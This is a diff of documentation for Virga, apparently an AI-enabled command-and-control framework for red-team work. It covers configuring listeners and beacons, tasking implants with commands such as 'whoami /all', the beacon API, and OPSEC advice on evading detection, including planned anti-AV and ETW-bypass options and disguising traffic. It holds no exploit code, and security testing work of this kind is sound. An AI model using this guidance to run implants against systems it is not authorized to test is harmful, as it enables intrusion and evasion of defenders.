+* `anti_av`: (Default: `true`) Include anti-AV detection features.
+* `anti_etw`: (Default: `true`) Include features to bypass Event Tracing for Windows (ETW).
+* `self_delete`: (Default: `false`) Enable the beacon to delete itself after execution.
+
+> **Note**: The `obfuscation`, `anti_av`, and `anti_etw` features are enabled by default to provide better operational security.
+
+### MCP Configuration
+
+Model Context Protocol (MCP) settings for AI/LLM integration.
+
+```yaml
+mcp:
+  enabled: true
+  sse_enabled: true
+  sse_port: ":8444"
+  sse_base_path: "/mcp"
+  stdio_enabled: false
+  remote_enabled: true
+  remote_base_url: "http://localhost:8444"
+  streamable_enabled: true
+  streamable_port: ":50012"
+```
+
+**Fields:**
+
+* `enabled`: Enable/disable all MCP functionalities.
+* `sse_enabled`: Enable the Server-Sent Events (SSE) transport layer.
+* `sse_port`: Port for the SSE server to listen on.
+* `sse_base_path`: Base URL path for SSE endpoints.
+* `stdio_enabled`: Enable the standard I/O transport (useful for local debugging).
+* `remote_enabled`: Enable the remote transport layer.
+* `remote_base_url`: The base URL for the remote MCP server.
+* `streamable_enabled`: Enable the streamable transport layer.
+* `streamable_port`: Port for the streamable transport server.
+
+## Configuration Validation
+
+The server validates the configuration file upon startup. If any checks fail, the server will exit with a fatal error.
+
+```bash
+# Start the server with your configuration
+./bin/virga-server --config config.yaml
+```
+
+Common validation errors, as implemented in the code, include:
+
+* **Missing Database Path**: The `database.path` field is required.
+* **No Listeners Defined**: At least one listener must be configured under the `listeners` section.
+* **Missing Listener Name**: Every listener must have a unique `name`.
+* **Invalid Port Number**: Listener `port` must be between 1 and 65535.
+* **Missing SSL Configuration**: If a listener has `use_ssl: true`, both `ssl.cert` and `ssl.key` paths must be provided.
+
+> **Note**: The server does **not** currently validate the format of encryption keys or check for duplicate listener names upon startup. These checks may be added in future versions.
+
+## Minimal Configuration
+
+Here's a minimal configuration to get started:
+
+```yaml
+server:
+  host: "0.0.0.0"
+  admin_port: 8443
+
+database:
+  type: "sqlite3"
+  path: "virga.db"
+
+listeners:
+  - name: "default"
+    type: "http"
+    bind_address: "0.0.0.0"
+    port: 8080
+    uri_path: "api/updates"
+    encryption:
+      type: "aes-256"
+      key: "change-this-key-in-production"
+```
+
+## Production Configuration
+
+For production deployments:
+
+```yaml
+server:
+  host: "0.0.0.0"
+  admin_port: 8443
+  session_timeout: "30m"
+  log_level: "warn"              # Less verbose logging
+  log_path: "/var/log/virga/server.log"
+
+database:
+  type: "sqlite3"
+  path: "/var/lib/virga/c2.db"
+
+listeners:
+  - name: "primary-https"
+    type: "https"
+    bind_address: "0.0.0.0"
+    port: 443
+    uri_path: "api/v2/updates"
+    ssl:
+      cert: "/etc/letsencrypt/live/c2.example.com/fullchain.pem"
+      key: "/etc/letsencrypt/live/c2.example.com/privkey.pem"
+    encryption:
+      type: "aes-256"
+      key: "${ENCRYPTION_KEY}"   # Use environment variable
+
+generator:
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  initial_sleep: 300             # 5 minutes
+  jitter: 30                     # 30% jitter
+  obfuscation: false             # Not implemented yet
+  anti_av: false                 # Not implemented yet
+  anti_etw: false                # Not implemented yet
+```
+
+## Planned Features
+
+The following features are planned for future releases:
+
+* **Database Support**: PostgreSQL and MySQL support
+* **Additional Listeners**: DNS, SMB, and mTLS protocols
+* **Authentication**: Token-based authentication, MFA, OAuth2
+* **Advanced Logging**: Multiple outputs, log rotation, audit logging
+* **Monitoring**: Prometheus metrics, health checks
+* **Security Features**: Rate limiting, ACLs, GeoIP filtering
+* **Configuration Management**: Hot reload, templates
+
+## Troubleshooting
+
+### Common Issues
+
+1. **Port Already in Use**
+   * Change the port in configuration
+   * Check for other processes using the port
+
+2. **Certificate Issues**
+   * Ensure certificate and key files exist
+   * Check file permissions
+   * Verify certificate validity
+
+3. **Database Lock**
+   * Ensure only one server instance is running
+   * Check database file permissions
+
+4. **Encryption Key Invalid**
+   * Key can be any string (will be normalized to 32 bytes)
+   * For best security, use a 32-byte key or generate one: `openssl rand -base64 32`
+
+### Debug Mode
+
+Enable debug mode for detailed logging:
+
+```bash
+./bin/virga-server --config config.yaml --debug
+```
+
+## Logging Configuration
+
+Virgaides comprehensive logging control for all components.
+
+### Server Logging
+
+#### Configuration File Settings
+
+```yaml
+server:
+  log_level: "info"              # Log verbosity level
+  log_path: "logs/server.log"    # Log file location
+```
+
+#### Command Line Options
+
+```bash
+# Set log level via command line
+./bin/virga-server --log-level debug
+
+# Enable debug mode (sets level to debug)
+./bin/virga-server --debug
+
+# Disable all logging
+./bin/virga-server --no-log
+```
+
+#### Environment Variables
+
+```bash
+# Set default log level
+export VIRGA_SERVER_LOG_LEVEL=debug
+./bin/virga-server
+```
+
+#### Priority Order
+
+1. Command-line flags (highest priority)
+2. Environment variables
+3. Configuration file
+4. Default values (lowest priority)
+
+### CLI Logging
+
+```bash
+# Command line options
+./bin/virga-cli --log-level debug
+./bin/virga-cli --quiet  # Sets level to ERROR
+
+# Environment variable
+export VIRGA_CLI_LOG_LEVEL=info
+```
+
+### Implant Logging
+
+Configure during beacon generation:
+
+```yaml
+# In beacon configuration
+logging:
+  enabled: true
+  level: "info"           # debug, info, warn, error, off
+  llama_log: true         # Enable LLM logs
+  execution_log: true     # Enable command execution logs
+```
+
+Runtime control via session commands:
+
+```bash
+> log status              # Check current status
+> log level debug         # Change log level
+> log disable             # Disable logging
+> log enable              # Enable logging
+```
+
+### Log Levels
+
+* `DEBUG`: Detailed debug information
+* `INFO`: General informational messages
+* `WARN`: Warning messages
+* `ERROR`: Error messages only
+* `OFF`: Disable all logging
+
+### Performance Considerations
+
+* DEBUG level can impact performance
+* Consider ERROR or OFF for production
+* Log file I/O affects implant stealth
+* Use log rotation for long-running servers
+
+## Next Steps
+
+* Review [Quick Start](/guide/quick-start) guide
+* Learn about [Beacon Generation](/usage/beacon-generation)
+* Check [Troubleshooting](/reference/troubleshooting) for issues
+
+---
+
+---
+url: /virga/guide/sessions.md
+---
+# Session Management
+
+This guide covers session management in Virga, including how beacon sessions are tracked, managed, and interacted with.
+
+## Overview
+
+A session represents an active connection from a beacon to the C2 server. Each session is a stateful object on the server that allows operators to:
+
+* Track real-time beacon status.
+* Issue commands and manage tasks asynchronously.
+* Transfer files to and from the target.
+* View metadata collected from the target system.
+
+## Session Lifecycle
+
+The lifecycle of a session from initial execution to termination:
+
+```mermaid
+stateDiagram-v2
+    [*] --> Initial: Beacon Executes
+    Initial --> Connecting: HTTP/HTTPS Request
+    Connecting --> Registered: Server Assigns ID
+    Registered --> Active: First Check-in
+    
+    Active --> Active: Regular Check-ins<br/>(Sleep + Jitter)
+    Active --> Lost: Timeout
+    Lost --> Active: Beacon Reconnects
+    
+    Active --> Terminated: Operator Kills
+    Lost --> Terminated: Operator Kills
+    Terminated --> [*]
+```
+
+## Session Information
+
+Each session on the server holds metadata about the beacon. This information is updated with each check-in.
+
+**Key Session Fields:**
+
+* **ID / BeaconID**: The unique identifier for the beacon session.
+* **IP**: The source IP address of the beacon.
+* **Hostname**: The hostname of the target system.
+* **Username**: The user context the beacon is running under.
+* **OS**: The operating system of the target (e.g., "windows", "linux").
+* **Arch**: The system architecture (e.g., "amd64", "arm64").
+* **ProcessID**: The Process ID (PID) of the beacon on the target.
+* **WorkingDir**: The current working directory of the beacon process.
+* **LastSeen**: The timestamp of the last successful check-in.
+* **Status**: The current status of the session (e.g., "active", "lost").
+
+## CLI Session Management
+
+### Listing Sessions
+
+Use `sessions list` to view all active sessions currently known to the server.
+
+```bash
+virga> sessions list
+Active sessions:
+ID                                   IP              Hostname        Last Seen
+--------------------------------------------------------------------------------
+a1b2c3d4-e5f6-7890-abcd-ef1234567890 192.168.1.10    TEST-PC         2025-06-25 10:30:00
+f9e8d7c6-b5a4-3210-9876-543210fedcba 10.0.0.5        prod-server-01  2025-06-25 10:28:15
+```
+
+### Interacting with a Session
+
+To issue commands to a beacon, you must first enter its interactive context using `interact`.
+
+```bash
+virga> interact a1b2c3d4-e5f6-7890-abcd-ef1234567890
+Now interacting with session a1b2c3d4-e5f6-7890-abcd-ef1234567890 (TEST-PC)
+virga (a1b2c3d4)>
+```
+
+Once inside a session context, you can run various interaction commands like `exec`, `ls`, `upload`, etc. To leave the context, use the `background` or `bg` command.
+
+### Terminating a Session
+
+To instruct a beacon to exit and remove its session from the server, use `sessions kill`.
+
+```bash
+virga> sessions kill a1b2c3d4-e5f6-7890-abcd-ef1234567890
+Session a1b2c3d4-e5f6-7890-abcd-ef1234567890 terminated.
+```
+
+## Task Management
+
+Virga an asynchronous task queue system for command execution. This ensures that commands are reliably delivered to beacons, even with long sleep times.
+
+**How it works:**
+
+1. An operator issues a command (e.g., `exec whoami`).
+2. The CLI sends the command to the server, which creates a **task** and queues it for the specific session.
+3. The beacon checks in at its next scheduled interval (sleep + jitter).
+4. The server sends any pending tasks to the beacon.
+5. The beacon executes the tasks and sends the results back on its next check-in.
+6. The CLI displays the results to the operator.
+
+**Task Status Flow:**
+
+* **Pending**: Queued on the server, waiting for the beacon to check in.
+* **Sent**: Delivered to the beacon for execution.
+* **Completed**: Executed by the beacon, and results have been returned.
+* **Failed**: The beacon reported an error during execution.
+
+## Database Storage
+
+Session and agent information is persisted in a local SQLite database (`data/virga.db` by default). The key tables involved in session management are:
+
+* **agents**: Stores a record of each unique beacon, identified by its ID, along with its metadata (hostname, OS, etc.).
+* **sessions**: Records each individual connection instance from an agent, linked to the `agents` table.
+* **commands**: A log of all tasks issued to sessions.
+* **command\_results**: The output from each executed task.
+* **files**: A record of all uploaded or downloaded files.
+
+## Troubleshooting
+
+* **Session Not Appearing**: This is often a connectivity issue. Verify that the target machine can reach the listener's host and port. Check for firewalls, incorrect listener configurations, or (for HTTPS) SSL/TLS certificate issues.
+* **Tasks Not Executing**: Check the session's `LastSeen` time in `sessions list`. If it's not updating, the beacon is not checking in. If it is updating but tasks aren't running, there may be an issue on the beacon side. Enabling implant logging during generation can help diagnose this.
+
+---
+
+---
+url: /virga/reference/troubleshooting.md
+---
+# Troubleshooting Guide
+
+This guide provides solutions to common problems you might encounter while using Virga.
+
+## 1. Server Startup & Configuration Issues
+
+Problems related to starting the `virga-server`.
+
+### Fatal error: config validation failed
+
+This is the most common startup error. It means your `config.yaml` file has an issue. The server performs several checks upon loading the configuration.
+
+* **`database path is required`**: Your `config.yaml` is missing the `database.path` field. Add it under the `database` section.
+  ```yaml
+  database:
+    path: "data/virga.db"
+    type: "sqlite3"
+  ```
+
+* **`at least one listener is required`**: You must define at least one listener under the `listeners:` section.
+
+* **`listener[0]: name is required`**: Every listener in your list must have a `name` field.
+
+* **`listener[0]: invalid port number`**: The `port` for a listener must be a valid number (e.g., 1-65535).
+
+* **`listener[0]: SSL enabled but missing cert/key`**: If you set `use_ssl: true` for a listener, you must provide valid paths for both `ssl.cert` and `ssl.key`.
+
+### Address already in use
+
+This error means another process is already using the port specified for a listener or the admin interface.
+
+* **Solution**: Identify and stop the conflicting process, or change the `port` in your `config.yaml` to an unused one.
+
+## 2. Beacon Generation Issues
+
+Problems encountered when using the `generate beacon` command in the CLI.
+
+### LLM model or library not found
+
+This is the most common issue when generating an AI-enabled beacon.
+
+* **Symptom**: The command fails with an error message like `llama library not found` or `llama model not found`.
+* **Cause**: The required AI model and platform-specific libraries have not been downloaded.
+* **Solution**: Run the following command from the project's root directory on the machine running the Virgaer:
+  ```bash
+  make download-llama-deps
+  ```
+
+### Cross-Compilation Errors (CGO)
+
+* **Symptom**: The build fails with CGO-related errors, especially when generating a beacon for a different operating system (e.g., building a Windows beacon from Linux).
+* **Cause**: Generating a beacon with AI features (`--enable-llama`) requires CGO. Cross-compiling CGO applications requires a specific toolchain.
+* **Solution**: Install the appropriate cross-compiler on your system. For example, to build for Windows from a Debian/Ubuntu system, you need `mingw-w64`:
+  ```bash
+  sudo apt install mingw-w64
+  ```
+
+## 3. Beacon Runtime & Connectivity Issues
+
+Problems after a beacon has been generated and deployed to a target.
+
+### Beacon does not connect / No session appears
+
+* **Connectivity**: Ensure the target machine can reach the C2 server and port specified during beacon generation. Check firewalls, network ACLs, and routing.
+* **Listener Mismatch**: Double-check that a listener is active on the server that matches the protocol, port, and host embedded in the beacon.
+* **Encryption Key Mismatch**: The encryption key is set on the *listener* in the server's `config.yaml`. The beacon will be generated to use this key. If you change the key on the server, you must regenerate the beacon.
+* **SSL/TLS Errors**: If using an `https` listener, ensure the target machine trusts the SSL certificate used by the server. For testing, self-signed certificates will often cause the connection to fail unless the beacon is specifically configured to ignore certificate errors (a feature not yet implemented).
+
+### AI Features Fail on Target
+
+* **Symptom**: The beacon connects, but `llama` commands fail or the AI does not behave as expected.
+* **Cause 1**: The beacon was not built with AI capabilities.
+  * **Solution**: Ensure you generated the beacon using the `--enable-llama` flag or with `llama.enabled: true` in your `beacon.yaml`.
+* **Cause 2**: Insufficient memory on the target machine.
+  * **Solution**: The AI model requires at least 2-4 GB of free RAM to load. The beacon may crash if the target does not have enough memory.
+
+## 4. CLI Usage Issues
+
+### Cannot connect to server
+
+* **Symptom**: The CLI fails to connect, showing a connection refused error.
+* **Cause**: You might be trying to connect to a *listener* port instead of the *admin* port.
+* **Solution**: Ensure the `--host` and `--port` flags for the CLI point to the `admin_port` defined in the server's `config.yaml` (default: 8443), not a beacon listener port (like 80 or 443).
+
+### "No active session" error
+
+* **Symptom**: Commands like `exec` or `ls` fail with this error.
+* **Cause**: These commands operate within the context of a specific session. You have not selected one yet.
+* **Solution**: First, list the available sessions with `sessions list`. Then, select one to interact with using `interact <session_id>`.
+
+---
+
+---
+url: /virga/reference/api-reference.md
+---
+# Virga API Reference
+
+This document provides a reference for the Virgaerver's API endpoints. The API is divided into two main categories:
+
+1. **Beacon API**: Endpoints used by the beacon implants to communicate with the server.
+2. **Admin API**: RESTful endpoints used by clients like the official CLI to manage the server, sessions, and listeners.
+
+## 1. Beacon API
+
+This is the primary endpoint for beacon check-ins. The exact path is configurable.
+
+### `POST /{uri_path}`
+
+This single endpoint handles all incoming communication from a beacon, including initial registration, task result submission, and requests for new tasks.
+
+* **Path**: The path is defined by the `uri_path` parameter in the listener's configuration (e.g., `/api/updates`).
+* **Method**: `POST`
+* **Content-Type**: `text/plain` (The body is a Base64-encoded, AES-encrypted JSON payload).
+
+#### Request Body (Decrypted JSON)
+
+The decrypted JSON payload sent by the beacon has the following structure, which corresponds to the `protocol.AgentMessage` struct in the source code.
+
+```json
+{
+  "agent_id": "unique-beacon-identifier",
+  "hostname": "TARGET-PC",
+  "username": "target-user",
+  "os": "windows",
+  "version": "1.0.0",
+  "ip": "192.168.1.10",
+  "boot_time": 1672531200,
+  "environment": {
+    "arch": "amd64",
+    "process_id": 1234,
+    "working_dir": "C:\\Users\\target-user"
+  },
+  "task_results": [
+    {
+      "task_id": "task-uuid-123",
+      "output": "...command output...",
+      "exit_code": 0,
+      "error": "",
+      "timestamp": 1672531260
+    }
+  ]
+}
+```
+
+#### Response Body (Decrypted JSON)
+
+The server responds with a JSON object containing new tasks for the beacon, corresponding to the `protocol.AgentResponse` struct.
+
+```json
+{
+  "status": "OK",
+  "tasks": [
+    {
+      "id": "new-task-uuid-456",
+      "task_id": "new-task-uuid-456",
+      "type": "shell",
+      "session_id": "unique-beacon-identifier",
+      "arguments": {
+        "command": "whoami /all"
+      },
+      "created_at": "2023-01-01T00:01:05Z",
+      "sent_time": "2023-01-01T00:01:05Z",
+      "status": "pending"
+    }
+  ],
+  "interactive": false,
+  "reconnect_time": 30
+}
+```
+
+* **interactive**: A boolean flag that tells the beacon to switch to a faster check-in interval.
+* **reconnect\_time**: The number of seconds the beacon should wait before its next check-in.
+
+## 2. Admin API
+
+These endpoints are served on the `admin_port` (default: 8443) and are used to manage the C2 server.
+
+### Session Management
+
+#### List Sessions
+
+Retrieves a list of all active sessions.
+
+* **Endpoint**: `GET /api/sessions`
+* **Success Response**: `200 OK`
+
+```json
+{
+  "success": true,
+  "sessions": [
+    {
+      "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+      "remote_addr": "192.168.1.10:12345",
+      "hostname": "TEST-PC",
+      "username": "test-user",
+      "os": "windows",
+      "last_activity": "2023-01-01T12:00:00Z",
+      "environment": {
+        "arch": "amd64",
+        "process_id": 1234
+      }
+    }
+  ]
+}
+```
+
+#### Add a Task to a Session
+
+Queues a new task for a specific session.
+
+* **Endpoint**: `POST /api/sessions/{id}/tasks`
+* **URL Parameters**: `id` (string, required) - The ID of the session.
+* **Request Body**:
+  ```json
+  {
+    "type": "shell",
+    "payload": {
+      "command": "net user"
+    }
+  }
+  ```
+* **Success Response**: `200 OK`
+  ```json
+  {
+    "success": true,
+    "task_id": "new-task-uuid-789",
+    "message": "Task added to queue"
+  }
+  ```
+
+#### Get All Task Results for a Session
+
+Retrieves all completed task results for a session.
+
+* **Endpoint**: `GET /api/sessions/{id}/tasks`
+* **Success Response**: `200 OK`
+
+#### Get a Specific Task Result
+
+Retrieves the result for a single task.
+
+* **Endpoint**: `GET /api/sessions/{id}/tasks/{taskID}`
+* **Success Response**: `200 OK`
+
+#### Set Interactive Mode
+
+Switches a session to interactive mode (faster check-ins).
+
+* **Endpoint**: `POST /api/sessions/{id}/interactive`
+* **Request Body**:
+  ```json
+  {
+    "interactive": true
+  }
+  ```
+* **Success Response**: `200 OK`
+
+### Listener Management
+
+#### List Listeners
+
+Retrieves a list of all configured listeners.
+
+* **Endpoint**: `GET /api/listeners`
+* **Success Response**: `200 OK`
+
+```json
+{
+    "success": true,
+    "listeners": [
+        {
+            "name": "default-http",
+            "type": "http",
+            "bind_address": "0.0.0.0",
+            "port": 8080,
+            "status": "running"
+        }
+    ]
+}
+```
+
+> **Note**: Creating and deleting listeners via the API is not yet implemented.
+
+```
+```
+
+---
+
+---
+url: /virga/README.md
+---
+# Virga Documentation
+
+This directory contains the VitePress documentation for Virga
+
+## Development
+
+```bash
+# Install dependencies
+bun install
+
+# Start development server
+bun docs:dev
+
+# Build for production
+bun docs:build
+
+# Preview production build
+bun docs:preview
+```
+
+## PR Preview
+
+Pull requests that modify documentation will automatically deploy a preview at:
+
+```
+https://r74tech.github.io/virga/pr-preview/pr-{PR_NUMBER}/
+```
+
+The preview link will be commented on the PR by the GitHub Actions bot.
+
+## Deployment
+
+Documentation is automatically deployed to GitHub Pages when changes are pushed to the main branch.
+
+Production URL: https://r74tech.github.io/virga/
+
+---
+
+---
+url: /virga/guide/security.md
+---
+# Virga Security Model
+
+This document outlines the security architecture and best practices for deploying and operating the Virgaramework. Understanding these concepts is crucial for maintaining operational security (OPSEC) and protecting both your infrastructure and your targets.
+
+## Guiding Principles
+
+* **Defense in Depth**: Security is implemented in layers, from network communication to implant behavior.
+* **Configurability**: Security features are designed to be adaptable to different operational scenarios.
+* **Transparency**: This document aims to be transparent about the current security features and their limitations.
+
+## Communication Security
+
+Securing the communication channel between the beacon and the C2 server is fundamental.
+
+### Transport Layer Security
+
+* **HTTPS Listeners**: It is strongly recommended to use `https` listeners for all production deployments. This encrypts traffic at the transport layer using TLS, protecting against eavesdropping and man-in-the-middle (MitM) attacks.
+* **SSL/TLS Certificates**: Use valid, trusted SSL/TLS certificates. While self-signed certificates can work for testing, they are easily detectable. Services like Let's Encrypt provide free, trusted certificates.
+
+### Application Layer Encryption
+
+* **AES-256-GCM**: All beacon communication is encrypted at the application layer using AES-256-GCM. This provides an additional layer of security, ensuring that even if TLS is compromised, the C2 traffic remains confidential.
+* **Encryption Key Management**:
+
+  > **⚠️ CRITICAL WARNING:** The default configuration uses a static, publicly known encryption key (`change-this-key-in-production-environment`). You **MUST** generate a unique, strong key for each deployment. Using the default key makes your C2 traffic trivial to decrypt.
+
+  **Generate a secure key using the provided script:**
+
+  ```bash
+  ./scripts/generate-secure-key.sh
+  ```
+
+  **Or generate manually:**
+
+  ```bash
+  # Generate a strong, random 32-byte key
+  openssl rand -base64 32
+
+  # Set as environment variable (recommended)
+  export VIRGA_ENCRYPTION_KEY='your-generated-key-here'
+  ```
+
+  **Configuration example:**
+
+  ```yaml
+  listeners:
+    - encryption:
+        key: ${VIRGA_ENCRYPTION_KEY}  # Use environment variable
+        type: aes-256
+  ```
+
+## Implant Security
+
+The security of the beacon implant itself is vital to avoid detection.
+
+### In-Memory Operations
+
+* **MemDB**: The AI-powered features use an in-memory database (`go-memdb`) to store operational data. This minimizes the disk footprint on the target system, making forensic analysis more difficult.
+* **Self-Deletion**: The `self_delete` option in the generator configuration, when enabled, attempts to remove the beacon binary from the disk after execution.
+
+### Obfuscation and Evasion
+
+* **Code Obfuscation (`obfuscation: true`)**: This feature is **planned** to automatically obfuscate the beacon's code, including string encryption and dynamic API resolution, to make reverse engineering more challenging.
+* **Anti-AV (`anti_av: true`)**: This feature is **planned** to incorporate techniques to bypass or disable common antivirus products.
+* **Anti-ETW (`anti_etw: true`)**: This feature is **planned** to include methods for patching Event Tracing for Windows (ETW) to reduce logging of malicious activities.
+
+> **Note**: As of the current version, these advanced evasion features are not yet implemented. Rely on other OPSEC measures for stealth.
+
+## Server Security
+
+Protecting the C2 server is as important as securing the implants.
+
+* **Admin API Access**: The admin port (default: `8443`) should be firewalled and accessible only from trusted IP addresses. Exposing it to the public internet is a significant risk.
+* **Database Security**: The SQLite database (`virga.db`) contains sensitive information, including session data, target information, and task history. Ensure the file has appropriate permissions and is encrypted at rest if required by your environment.
+* **Logging**: Monitor server logs (`logs/server.log`) for suspicious activity. In a production environment, consider shipping logs to a secure, centralized logging solution.
+
+## Operational Security (OPSEC) Best Practices
+
+* **Listener Profiles**: Customize your listener profiles to mimic legitimate web traffic. Use common `uri_path` values and consider using a redirector to hide the true location of your C2 server.
+* **User-Agent**: Change the default `user_agent` in your generator settings to blend in with the target environment.
+* **Jitter**: Always use a `jitter` value (e.g., 20-30%) to randomize beacon check-in intervals, making traffic analysis more difficult.
+* **Legal and Ethical Use**: This tool is intended for authorized security testing and research only. Unauthorized use is illegal and unethical. Always adhere to the law and obtain explicit permission before using Virga
